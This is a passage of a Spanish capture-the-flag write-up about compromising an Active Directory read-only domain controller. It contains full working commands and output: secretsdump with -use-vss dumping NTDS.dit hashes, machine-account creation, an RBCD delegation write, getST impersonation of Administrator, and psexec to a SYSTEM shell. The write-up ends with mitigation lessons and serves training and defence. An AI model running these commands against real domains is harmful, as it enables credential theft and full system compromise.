  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
```

**Hallazgo:** el volcado inicial falla en la parte de `NTDS.dit` (error `00000057`). Se reintenta con la opción **`-use-vss`** (Volume Shadow Copy), que crea una copia de sombra del `NTDS.dit` y la extrae:

```bash
proxychains impacket-secretsdump 'l.wilson_adm:Password123!@rodc01.garfield.htb' -use-vss
```

**Resultado (extracto):**

```
[*] Target system bootKey: 0x0821167a7588e6d2b614897381a821e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:75be66596ddc5654acafd187fe51b960:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
GARFIELD\RODC01$:aes256-cts-hmac-sha1-96:53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
GARFIELD\RODC01$:aes128-cts-hmac-sha1-96:52432a8bdb5b11e64f3c9f53ef712b50
GARFIELD\RODC01$:des-cbc-md5:d0bcec45048f896b
GARFIELD\RODC01$:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xaadd93a8b30c0fc22ad839d8bfdc9ee6ec158197
dpapi_userkey:0x2d4b8deaff672885e9e9ebf80897999fb759a12c
[*] NL$KM
 0000   6B 11 7A B9 57 D2 77 C0  42 65 19 7C 78 9B 01 E6   k.z.W.w.Be.|x...
 0010   64 DA 6F DF DC B9 B0 E9  A1 C2 6C 0B FA 72 24 7B   d.o.......l..r${
 0020   A3 A6 C7 A3 05 1A 29 42  06 AF 0B 84 82 F0 F3 B8   ......)B........
 0030   21 71 96 71 1A 8D 6F 73  B0 DD E8 B0 7E FE 22 1F   !q.q..os....~.".
NL$KM:6b117ab957d277c04265197c789b01e664da6fdfdcb9b0e9a1c26c0bfa72247ba3a6c7a3051a294206af0b8482f0f3b8217196711a8d6f73b0dde8b07efe221f
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 0dbed7fb4dbdc0fa9033a4c97b65a0e6
[*] Reading and decrypting hashes from \\rodc01.garfield.htb\ADMIN$\Temp\PBVkpMMM.tmp
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RODC01$:1602:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::
garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
garfield.htb\l.wilson:3105:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys from \\rodc01.garfield.htb\ADMIN$\Temp\PBVkpMMM.tmp
RODC01$:aes256-cts-hmac-sha1-96:53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
RODC01$:aes128-cts-hmac-sha1-96:52432a8bdb5b11e64f3c9f53ef712b50
RODC01$:des-cbc-md5:469715524c1c02df
[*] Cleaning up...
```

### 6.5 Análisis de los hashes extraídos y la cuenta `krbtgt_8245`

| Cuenta | Hash NT | ¿Válido? |
|---|---|---|
| `Administrator` | `31d6cfe0d16ae931b73c59d7e0c089c0` | **Hash de contraseña vacía** (no utilizable) |
| `krbtgt` | `31d6cfe0d16ae931b73c59d7e0c089c0` | **Hash de contraseña vacía** (no utilizable) |
| `krbtgt_8245` | `445aa4221e751da37a10241d962780e2` | **Hash real**, correspondiente al RODC |
| `j.arbuckle` | `31d6cfe0d16ae931b73c59d7e0c089c0` | Hash vacío |
| `l.wilson` | `31d6cfe0d16ae931b73c59d7e0c089c0` | Hash vacío |

**Hallazgo:** la mayoría de los hashes del `NTDS.dit` del RODC están **vacíos** porque el RODC **no almacena las contraseñas de los usuarios del dominio** a menos que estén en el grupo **`Allowed RODC Password Replication Group`**. El único hash con valor real es **`krbtgt_8245`**, la cuenta `krbtgt` específica del RODC.

#### ¿Qué es `krbtgt_8245` y por qué es relevante?

Cada **RODC** tiene su propia cuenta **`krbtgt_<RID>`** (en este caso `krbtgt_8245`, RID 1603). Esta cuenta es un **krbtgt local** que el RODC utiliza para **emitir TGTs a los usuarios que se autentican contra él**. El `krbtgt` del dominio principal (`krbtgt`, RID 502) **no se replica** al RODC; por eso el RODC tiene el suyo.

**Implicaciones ofensivas:**

- Con el hash de **`krbtgt_8245`**, un atacante puede **forjar un TGT (Golden Ticket) válido para el RODC**. Este TGT sería aceptado por el RODC como si hubiera sido emitido por su propio KDC.
- Sin embargo, **no sirve para forjar TGTs para el dominio principal**, porque el `krbtgt` del dominio es otro.
- Para un **Golden Ticket completo** (acceso a cualquier recurso del dominio), se necesita el hash del **`krbtgt` del dominio principal**, que aquí está vacío.

**Limitación práctica:** el Golden Ticket para el RODC permite autenticarse contra el RODC, pero para **ejecutar código como SYSTEM** en el RODC se necesita un **ticket de servicio** (no un TGT). Los TGTs sirven para obtener tickets de servicio (TGS), pero el RODC **no acepta TGTs forjados para servicios locales** si no se presentan como tickets de servicio. Por eso se recurrió a **RBCD** para obtener un TGS directamente.

**¿Por qué no se usó el Golden Ticket del RODC?** El hash de `krbtgt_8245` está en formato **NT (RC4)**. Para forjar un Golden Ticket con `ticketer.py` de Impacket, se necesita el hash en formato **AES** (AES256 o AES128) o el hash NT, pero `ticketer.py` **no acepta directamente el hash NT de `krbtgt`** en todas las versiones. Además, el RODC **no tiene la versión AES** de `krbtgt_8245` en el `NTDS.dit` extraído (solo el hash NT). Para obtener la versión AES sería necesario **interactuar con LSASS** (por ejemplo, con Mimikatz), lo que **aumenta la probabilidad de detección**. Por eso se optó por RBCD.

---

## Fase 7: RBCD sobre `RODC01$` y compromiso total

### 7.1 ¿Qué es RBCD?

**Resource-Based Constrained Delegation (RBCD)** es una funcionalidad de AD que permite al **propietario de un recurso** (en este caso, el objeto de equipo `RODC01$`) especificar **qué cuentas pueden actuar en su nombre** para la delegación. Se configura mediante el atributo **`msDS-AllowedToActOnBehalfOfOtherIdentity`** del objeto de recurso.

Si un atacante controla una cuenta de equipo (por ejemplo, `KALI$`) y tiene permiso para escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en `RODC01$`, puede configurar RBCD para que `KALI$` pueda **impersonar a cualquier usuario** (incluido `Administrator`) al solicitar un ticket de servicio para `RODC01$`.

**Requisitos:**

1. Control de una cuenta de equipo (o usuario con SPN) → se creó `KALI$`.
2. Permiso de escritura sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` del objetivo → `l.wilson_adm` lo tiene sobre `RODC01$`.

### 7.2 Creación de la cuenta de equipo `KALI$`

`l.wilson_adm` tiene `SeMachineAccountPrivilege` y el dominio permite `MachineAccountQuota: 10`. Se creó la cuenta:

```bash
impacket-addcomputer 'garfield.htb/l.wilson_adm:Password123!' -dc-ip dc01.garfield.htb -computer-name KALI$ -computer-pass 'Password123!'
```

**Resultado:**

```
[*] Successfully added machine account KALI$ with password Password123!.
```

### 7.3 Configuración de RBCD

Se configuró RBCD en `RODC01$` para permitir que `KALI$` actúe en su nombre:

```bash
impacket-rbcd 'garfield.htb/l.wilson_adm:Password123!' -dc-ip dc01.garfield.htb -delegate-to 'RODC01$' -delegate-from 'KALI$' -action write
```

**Resultado:**

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] KALI$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     KALI$        (S-1-5-21-2502726253-3859040611-225969357-11101)
```

**Hallazgo:** el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de `RODC01$` ahora incluye el SID de `KALI$`. Esto habilita a `KALI$` para solicitar tickets de servicio en nombre de cualquier usuario hacia `RODC01$`.

### 7.4 Obtención del ticket de servicio (S4U2Proxy)

Antes de solicitar el ticket, se sincronizó la hora con el DC (recordemos el **clock skew de 8 horas**):

```bash
sudo timedatectl set-ntp false
```

```bash
sudo killall VBoxService
```

```bash
sudo ntpdate -u garfield.htb
```

**Resultado:**

```
2026-11-09 07:28:46.216708 (-0500) +28802.669870 +/- 0.073876 garfield.htb 10.129.244.207 s1 no-leap
CLOCK: time stepped by 28802.669870
```

Se generó un archivo `krb5.conf` para el dominio:

```bash
nxc smb dc01.garfield.htb --generate-krb5-file garfield.krb5
```

**Resultado:**

```
SMB         10.129.244.207  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.207  445    DC01             [+] krb5 conf saved to: garfield.krb5
SMB         10.129.244.207  445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=garfield.krb5
```

Se solicitó un ticket de servicio para `cifs/rodc01.garfield.htb` **impersonando a `Administrator`** mediante S4U2Self + S4U2Proxy:

```bash
impacket-getST -spn cifs/rodc01.garfield.htb -impersonate administrator garfield.htb/'KALI$':'Password123!'
```

**Resultado:**

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_rodc01.garfield.htb@GARFIELD.HTB.ccache
```

**Análisis:** el ticket `.ccache` generado contiene un **TGS para `cifs/rodc01.garfield.htb`** con la identidad de **`Administrator`**. Es decir, `KALI$` ha utilizado RBCD para obtener un ticket de servicio como si fuera `Administrator` hacia el RODC.

### 7.5 Ejecución como SYSTEM con `psexec`

Se utilizó el ticket para autenticarse contra el RODC y ejecutar `psexec`:

```bash
KRB5CCNAME=administrator@cifs_rodc01.garfield.htb@GARFIELD.HTB.ccache proxychains impacket-psexec rodc01.garfield.htb -k
```

**Resultado:**

```
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  rodc01.garfield.htb:445  ...  OK
[*] Requesting shares on rodc01.garfield.htb.....
[*] Found writable share ADMIN$
[*] Uploading file IvgNTSie.exe
[*] Opening SVCManager on rodc01.garfield.htb.....
[*] Creating service KGaw on rodc01.garfield.htb.....
[*] Starting service KGaw.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  rodc01.garfield.htb:445  ...  OK
Microsoft Windows [Version 10.0.17763.8511]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Hallazgo:** se obtuvo una shell como **`NT AUTHORITY\SYSTEM`** en el RODC. El compromiso del RODC está completo.

---

## 📌 Conclusión

1. **Reconocimiento** → DC `garfield.htb` (WS2019), SMB signing, WinRM y RDP. Presencia de `krbtgt_8245` → indica un RODC.
2. **Enumeración con `j.arbuckle`** → permiso `scriptPath` sobre `l.wilson` y `l.wilson_adm`. BloodHound confirma el vector.
3. **Ataque de `scriptPath`** → script en `SYSVOL\scripts` que fuerza autenticación SMB → hash NetNTLMv2 de `l.wilson` y cambio de contraseña de `l.wilson_adm` a `Password123!`.
4. **Acceso a `l.wilson_adm`** → WinRM en DC01. Miembro de `Tier 1`.
5. **Pivote al RODC** → Chisel SOCKS5 → WinRM a `rodc01.garfield.htb` (192.168.100.2).
6. **Escalada en RODC** → `l.wilson_adm` se añade a `RODC Administrators` → `secretsdump -use-vss` extrae el `NTDS.dit` del RODC.
7. **Análisis de hashes** → solo `krbtgt_8245` tiene hash real; los demás están vacíos. El Golden Ticket del RODC queda limitado por la falta de claves AES.
8. **RBCD** → creación de `KALI$`, configuración de `msDS-AllowedToActOnBehalfOfOtherIdentity` en `RODC01$`, `getST` impersonando a `Administrator` → `psexec` → **SYSTEM en el RODC**.

---

## 📚 Lecciones aprendidas

1. **El atributo `scriptPath` es un vector de ejecución de código en la sesión del usuario**  
   Escribir `scriptPath` y colocar un script en `SYSVOL\scripts` permite ejecutar código cuando la víctima inicia sesión. Mitigación: auditar permisos de escritura sobre `scriptPath` y restringir la escritura en `SYSVOL`/`NETLOGON` a administradores.

2. **Los RODC tienen su propio `krbtgt` (`krbtgt_<RID>`)**  
   El hash de `krbtgt_<RID>` permite forjar TGTs para el RODC, pero no para el dominio principal. Para un Golden Ticket completo se necesita el `krbtgt` del dominio. No obstante, el `krbtgt` del RODC sigue siendo un activo de alto valor para movimientos laterales dentro del RODC.

3. **El volcado del `NTDS.dit` de un RODC devuelve hashes vacíos para la mayoría de usuarios**  
   El RODC solo almacena contraseñas de usuarios en el grupo `Allowed RODC Password Replication Group`. Por eso `secretsdump` muestra hashes vacíos. El único hash útil suele ser el de las cuentas locales del RODC (`krbtgt_<RID>`, `RODC01$`, etc.).

4. **RBCD es una alternativa sigilosa al Golden Ticket cuando no se dispone de claves AES**  
   RBCD permite obtener un ticket de servicio como cualquier usuario (incluido `Administrator`) sin tocar LSASS. Requiere control de una cuenta de equipo y permiso de escritura sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` del objetivo. Es una técnica cada vez más común en entornos con RODC.

5. **El grupo `RODC Administrators` otorga privilegios locales en el RODC**  
   Aunque no es Domain Admin, permite extraer secretos locales, ejecutar código como SYSTEM y, combinado con RBCD, comprometer el RODC por completo. Auditar la composición de este grupo y los permisos de `Tier 1` para añadirse a él.

6. **El clock skew es crítico en Kerberos**  
   Un desfase de 8 horas impide la autenticación Kerberos. Siempre sincronizar la hora (`ntpdate`) antes de usar `getST`, `psexec -k` o cualquier herramienta que dependa de tickets.

7. **La enumeración de BloodHound debe complementarse con `bloodyAD` y `dacledit`**  
   BloodHound muestra las rutas de escalada, pero `bloodyAD` y `dacledit` confirman los permisos exactos (como `WriteProperty` sobre `scriptPath`) y permiten explotarlos directamente.
